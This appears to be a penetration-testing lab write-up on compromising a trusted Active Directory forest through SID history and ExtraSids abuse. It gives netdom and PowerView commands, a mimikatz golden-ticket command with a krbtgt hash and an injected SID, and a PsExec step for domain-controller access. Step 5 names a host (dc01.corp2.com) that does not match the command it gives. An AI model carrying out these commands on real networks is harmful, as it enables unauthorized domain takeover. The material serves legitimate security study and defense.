# Owning The Forest - Extra SID

ExtraSids allow us to create a TGT that let us become members of the Entreprise Admins group.

Forest trust introduces the concept of SID filtering. In forest trust, the contents of the ExtraSids field are filtered so group memberships are not blindly trusted.

Once the TGT reaches the domain controller, that ExtraSids entry is removed and a TGS is returned to us.

We can use Netdom on the domain controller that controls the incoming trust to allow SID history, which eases the strict SID filtering.

1. Enable SID History.

```PowerShell
C:\Users\Administrator> netdom trust fallenangels2.com /d:sinhack1.com /enablesidhistory:yes
```

2. Verify our change by using PowerView.

```
PS C:\Tools> Get-DomainTrust -Domain fallenangels2.com
```

TrustAttributes is set to TREAT_AS_EXTERNAL value, indicating that the forest trust is instead treated as an external trust but with the transitivity of normal forest trust.
Unfortunately, we still do not have the ability to compromise the trusted forest. While we enabled SID history, SID filtering is still active.

Microsoft dictated that any SID with a RID less than 1000 will always be filtered regardless of the SID history setting.
However, a SID with a RID equal to or higher than 1000 is not filtered for external trust.

When we queried the trust object after enabling SID history, we found that the forest trust is treated as an external trust.
A non-default group will always have a RID equal to or higher than 1000. If we can find a custom group whose membership will allow us to compromise a user or computer, we can use that as an entry point.

If the custom group we attempt to abuse is a member a global security group like Domain Admins or Enterprise Admins, that access will also be filtered. 
Only group membership in domain local security groups is not filtered.

3. Find a member which had a RID higher than 1000 and that is administrator to give us local administrator access to fallenangels2.com

```
PS C:\tools> Get-DomainGroupMember -Identity "Administrators" -Domain fallenangels2.com
```

4. Let’s modify our golden ticket command to include the SID of our member using mimikatz

```bash
mimikatz # kerberos::golden /user:h4x /domain:sinhack1.com /sid:S-1-5-21-1095350385-1831131555-2411080359 /krbtgt:21342f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-3312342938-3243167060-1415962734-1109 /ptt

```

5. With the ticket crafted and loaded into memory, we’ll again attempt to gain access to dc01.corp2.com with PsExec :

```bash
C:\> c:\tools\SysinternalsSuite\PsExec.exe \\dc01.fallenangels2.com cmd
```
